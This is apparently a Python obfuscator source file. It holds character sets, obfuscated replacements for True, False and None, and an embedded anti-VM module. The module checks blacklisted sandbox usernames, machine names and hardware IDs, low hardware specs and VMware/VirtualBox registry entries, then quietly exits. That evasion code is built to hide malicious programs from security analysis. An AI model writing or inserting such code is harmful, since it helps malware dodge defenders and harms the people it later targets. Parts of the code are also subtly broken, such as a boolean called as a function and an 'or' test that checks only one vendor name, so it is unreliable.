import random

whitespace = ' \t\n\r\v\f'
ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ascii_letters = ascii_lowercase + ascii_uppercase
digits = '0123456789'
ascii_letters_digits = ascii_letters + digits
hexdigits = digits + 'abcdef' + 'ABCDEF'
symbols = r"""!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""
emojis = """😀😁😂🤣😃😄😅😆😉😊😋😎😍😘😗😙😚😜😝😛🤑🤗🤓😎🤡🤠😏😒😞😔😟😕🙁😣😖😫😩😤😠😡😶😐😑😯😦😧😮😲😵😳😱😨😰😢😥🤤😭😓😪😴🙄🤔🤥😬🤐🤢🤧😷🤒🤕😈👿👹👺💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾👐🙌👏🙏🤝👍👎👊✊🤛🤜🤞✌️🤘👌👈👉👆👇☝️✋🤚🤙🖐🖖👋🤙💪🖕✍️🤳💅🖖💄💋👄👅👂👃👣👁👀🗣👤👥👶👦👧👨👩👱‍♀️👨‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩‍🦰👩‍🦱👩‍🦳👩‍🦲👵👴👲👳‍♀️👳‍♂️👮‍♀️👮‍♂️👷‍♀️👷‍♂️💂‍♀️💂‍♂️🕵️‍♀️🕵️‍♂️👩‍⚕️👨‍⚕️👩‍🌾👨‍🌾👩‍🍳👨‍🍳👩‍🎓👨‍🎓👩‍🎤👨‍🎤👩‍🏫👨‍🏫👩‍🏭👨‍🏭👩‍💻👨‍💻👩‍💼👨‍💼👩‍🔧👨‍🔧👩‍🔬👨‍🔬👩‍🎨👨‍🎨👩‍🚒👨‍🚒👩‍✈️👨‍✈️👩‍🚀👨‍🚀👩‍⚖️👨‍⚖️🤶🎅👸🤴👰🤵👼🤰🙇‍♀️🙇💁💁‍♂️🙅🙅‍♂️🙆🙆‍♂️🙋🙋‍♂️🤦‍♀️🤦‍♂️🤷‍♀️🤷‍♂️🙎🙎‍♂️🙍🙍‍♂️💇💇‍♂️💆💆‍♂️🕴💃🕺👯👯‍♂️🚶‍♀️🚶🏃‍♀️🏃👫👭👬💑👩‍❤️‍👩👨‍❤️‍👨💏👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👪👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧👚👕👖👔👗👙👘👠👡👢👞👟👒🎩🎓👑⛑🎒👝👛👜💼👓🕶🌂☂️💄💋👣👄👅👂👃👁👀🗣👤👥👶👦👧👨👩👱‍♀️👨‍♀️👨‍🦰👨‍🦱👨‍🦳👨‍🦲👩‍🦰👩‍🦱👩‍🦳👩‍🦲👴👵👲👳‍♀️👳‍♂️🎓👮‍♀️👮‍♂️🕵️‍♀️🕵️‍♂️👷‍♀️👷‍♂️💂‍♀️💂‍♂️🕵️‍♀️🕵️‍♂️👩‍⚕️👨‍⚕️👩‍🌾👨‍🌾👩‍🍳👨‍🍳👩‍🎓👨‍🎓👩‍🎤👨‍🎤👩‍🏫👨‍🏫👩‍🏭👨‍🏭👩‍💻👨‍💻👩‍💼👨‍💼👩‍🔧👨‍🔧👩‍🔬👨‍🔬👩‍🎨👨‍🎨👩‍🚒👨‍🚒👩‍✈️👨‍✈️👩‍🚀👨‍🚀👩‍⚖️👨‍⚖️🤶🎅👸🤴👰🤵👼🤰🙇‍♀️🙇💁💁‍♂️🙅🙅‍♂️🙆🙆🏻🙆🏼🙆🏽🙆🏾🙆🏿🙅🏻🙅🏼🙅🏽🙅🏾🙅🏿🙋🏻🙋🏼🙋🏽🙋🏾🙋🏿💆🏻💆🏼💆🏽💆🏾💆🏿💇🏻💇🏼💇🏽💇🏾💇🏿👩🏻‍🎓👨🏻‍🎓👩🏻‍💻👨🏻‍💻👩🏻‍🎤👨🏻‍🎤👩🏻‍🎨👨🏻‍🎨👩🏻‍🚒👨🏻‍🚒👩🏻‍✈️👨🏻‍✈️👩🏻‍🚀👨🏻‍🚀👩🏻‍⚖️👨🏻‍⚖️👰🏻‍🎀👸🏻🤴🏻👰🏻🤵🏻👨🏻‍🌾👩🏻‍🌾👨🏻‍🍳👩🏻‍🍳👨🏻‍🎄👩🏻‍🎄🤶🏻🎅🏻👸🏻🤴🏻👰🏻🤵🏻👨🏻‍🎤👩🏻‍🎤👨🏻‍🔧👩🏻‍🔧👨🏻‍🍳👩🏻‍🍳👨🏻‍🔬👩🏻‍🔬👨🏻‍💼👩🎤🦠🎙🔬"""
# inbuilts = [
#     'str', 'int', 'float', 'bool', 'list', 'dict', 'tuple', 'set', 'bytes', 'bytearray', 'hash',
#     'memoryview', 'complex', 'range', 'slice', 'hex', 'oct', 'bin', 'chr', 'ord', 'lambda {0}: {0}'.format(random.choice(ascii_letters)),
#     'globals', 'vars', 'dir', 'eval', 'exec', 'compile', 'repr', 'format', 'open', 'apply', 'coerce',
#     'abs', 'help', 'min', 'setattr', 'all', 'next', 'any', 'divmod', 'id', 'object', 'sorted', 'ascii', 'cmp',
#     'enumerate', 'input', 'staticmethod', 'classmethod', 'isinstance', 'sum', 'filter', 'issubclass', 'pow',
#     'print', 'callable', 'len', 'property', 'type', 'frozenset', 'iter', 'apply', 'basestring', 'buffer', 'dreload',
#     'locals', 'zip', 'map', 'reversed', 'hasattr', 'max', 'round', 'delattr', 'getattr', 'file', 'intern', 'ip_set_hook',
#     'ipalias', 'ipmagic', 'ipsystem', 'jobs', 'long', 'reduce', 'reload', 'unichr', 'unicode', 'xrange',
#     'super', 'Ellipsis', 'None', 'True', 'False', 'copyright', 'credits', 'exit', 'license', 'quit', 'execfile',

#     'AssertionError', 'AttributeError', 'NotImplemented', 'ArithmeticError', 'BaseException', 'StopIteration', 'BufferError',
#     'BytesWarning', 'DeprecationWarning', 'EOFError', 'EnvironmentError', 'Exception', 'FloatingPointError', 'FutureWarning',
#     'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyboardInterrupt',
#     'KeyError', 'LookupError', 'MemoryError', 'NameError', 'NotImplementedError', 'OSError', 'OverflowError', 'ZeroDivisionError',
#     'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError',
#     'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError',
#     'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError',

#     '__debug__', '__doc__', '__name__', '__package__', '__builtins__', '__file__', '__cwd__', '__loader__', '__spec__', '__import__'
# ]
inbuilts = dir(__import__('builtins'))

replacements = {
    True: '(()==())',
    False: '(()==[])',
    None: 'exec("")',
    # 'pass': '...',
}
########################################################################################################################

antivm_code = """import os
import winreg
import threading
import psutil
import subprocess
class AntiDebug:
    inVM = False
    def __init__(self):
        self.processes = list()
        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq","Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl"]
        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM","DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4","RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27"]
        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue
    def programExit(self):
        self.__class__.inVM = True
    def listCheck(self):
        for path in [r'D:\\Tools', r'D:\\OS2', r'D:\\NT3X']:
            if os.path.exists(path):
                self.programExit()
        for user in self.blackListedUsers:
            if os.getlogin() == user:
                self.programExit()
        for pcName in self.blackListedPCNames:
            if os.getenv("COMPUTERNAME") == pcName:
                self.programExit()
        try:
            myHWID = subprocess.check_output(r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\\n')[1].strip()
        except Exception:
            myHWID = ""
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()
    def specsCheck(self):
        if int(str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]) <= 2:
            self.programExit()
        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]) <= 50:
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()
    def registryCheck(self):
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)
if AntiDebug().inVM():
    os._exit(0)
"""
